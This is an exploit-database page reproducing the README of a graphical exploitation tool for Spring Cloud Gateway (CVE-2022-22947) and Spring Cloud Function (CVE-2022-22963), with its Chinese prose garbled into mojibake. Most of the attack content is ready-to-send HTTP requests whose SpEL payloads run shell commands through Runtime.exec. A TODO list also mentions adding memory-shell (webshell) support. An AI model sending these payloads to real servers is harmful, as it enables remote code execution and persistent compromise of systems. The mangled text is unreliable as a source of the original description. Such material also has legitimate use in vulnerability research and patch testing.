---
title: Exploit for Code Injection in Vmware Spring Cloud Gateway exploit
url: https://sploitus.com/exploit?id=FCB41C86-C31E-58AE-9055-459DC713CABD&utm_source=rss&utm_medium=rss
source: Sploitus.com Exploits RSS Feed
date: 2022-10-30
fetch_date: 2025-10-03T21:17:16.385091
---

# Exploit for Code Injection in Vmware Spring Cloud Gateway exploit

[x]
Dark Mode

[##### SPLOITUS](/)

# Exploit for Code Injection in Vmware Spring\_Cloud\_Gateway CVE-2022-22947 CVE-2022-22963

2022-10-29 | CVSS 10.0

Copy
Download
Source
[Share](#share-url)

```
## https://sploitus.com/exploit?id=FCB41C86-C31E-58AE-9055-459DC713CABD
Spring_All_Reachable
ä¸€æ¬¾é’ˆå¯¹Springæ¼æ´žæ¡†æž¶è¿›è¡Œå¿«é€Ÿåˆ©ç”¨çš„å›¾å½¢åŒ–å·¥å…·

# ðŸ“ TODO

* Spring Core RCE
* æ”¯æŒæ›´å¤šç±»åž‹å†…å­˜é©¬
* æ”¯æŒå†…å­˜é©¬å¯†ç ä¿®æ”¹

........

# :clapper:ä½¿ç”¨æ–¹æ³•

### Spring Cloud Gatewayå‘½ä»¤æ‰§è¡Œï¼ˆCVE-2022-22947ï¼‰

#### æ¼æ´žæè¿°

Spring Cloud Gatewayå­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žï¼Œè¯¥æ¼æ´žæ˜¯å‘ç”Ÿåœ¨Spring Cloud Gatewayåº”ç”¨ç¨‹åºçš„Actuatorç«¯ç‚¹ï¼Œå…¶åœ¨å¯ç”¨ã€å…¬å¼€å’Œä¸å®‰å…¨çš„æƒ… å†µä¸‹å®¹æ˜“å—åˆ°ä»£ç æ³¨å…¥çš„æ”»å‡»ã€‚æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´žé€šè¿‡æ¶æ„åˆ›å»ºå…è®¸åœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œä»»æ„è¿œç¨‹è¯·æ±‚ã€‚

#### æ¼æ´žå½±å“

â€‹	VMWare Spring Cloud GateWay 3.1.0
â€‹	VMWare Spring Cloud GateWay >=3.0.0ï¼Œ<=3.0.6
â€‹	VMWare Spring Cloud GateWay <3.0.0

#### æ¼æ´žpoc

```
POST /actuator/gateway/routes/hacktest HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 328

{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}
  }],
"uri": "http://example.com",
"order": 0
}
```

```
POST /actuator/gateway/refresh HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

```

```
GET /actuator/gateway/routes/hacktest HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

```

```
DELETE /actuator/gateway/routes/hacktest HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close

```

```
POST /actuator/gateway/refresh HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

```

#### å·¥å…·ä½¿ç”¨

![image-20230601131042060](./assets/image-20230601131042060.png)

![image-20230601131127171](./assets/image-20230601131127171.png)

![image-20230601134110151](./assets/image-20230601134110151.png)

### Spring Cloud Function SpEL è¿œç¨‹ä»£ç æ‰§è¡Œ (CVE-2022-22963)

#### æ¼æ´žæè¿°

Spring Cloud Function æ˜¯Spring cloudä¸­çš„serverlessæ¡†æž¶ã€‚

Spring Cloud Function ä¸­çš„ RoutingFunction ç±»çš„ apply æ–¹æ³•å°†è¯·æ±‚å¤´ä¸­çš„â€œspring.cloud.function.routing-expressionâ€å‚æ•°ä½œä¸º Spel è¡¨è¾¾å¼è¿›è¡Œå¤„ç†ï¼Œé€ æˆ Spel è¡¨è¾¾å¼æ³¨å…¥æ¼æ´žã€‚

æ”»å‡»è€…å¯é€šè¿‡è¯¥æ¼æ´žæ‰§è¡Œä»»æ„ä»£ç ã€‚

#### æ¼æ´žå½±å“

org.springframework.cloud:spring-cloud-function-contextï¼ˆå½±å“ç‰ˆæœ¬ï¼š3.0.0.RELEASE~3.2.2ï¼‰

#### æ¼æ´žpoc

```
POST /functionRouter HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("touch /tmp/success")
Content-Type: text/plain
Content-Length: 4

test
```

#### å·¥å…·ä½¿ç”¨

![image-20230601130120697](./assets/image-20230601130120697.png)

![image-20230601130234458](./assets/image-20230601130234458.png)

# :book: å‚è€ƒé¡¹ç›®

[https://starchart.cc/0x727/SpringBootExploit](https://github.com/0x727/SpringBootExploit)

[https://github.com/whwlsfb/cve-2022-22947-godzilla-memshell](https://github.com/whwlsfb/cve-2022-22947-godzilla-memshell)

# :b:å…è´£å£°æ˜Ž

â€‹	æ­¤å·¥å…·ä»…ä½œä¸ºç½‘ç»œå®‰å…¨æ”»é˜²ç ”ç©¶äº¤æµï¼Œè¯·ä½¿ç”¨è€…éµç…§ç½‘ç»œå®‰å…¨æ³•åˆç†ä½¿ç”¨ï¼ å¦‚æžœä½¿ç”¨è€…ä½¿ç”¨è¯¥å·¥å…·å‡ºçŽ°éžæ³•æ”»å‡»ç­‰è¿æ³•è¡Œä¸ºï¼Œä¸Žæœ¬ä½œè€…æ— å…³ï¼

![as](https://starchart.cc/savior-only/Spring_All_Reachable.svg)
```

Share

Copy

![](https://mc.yandex.ru/watch/54912310)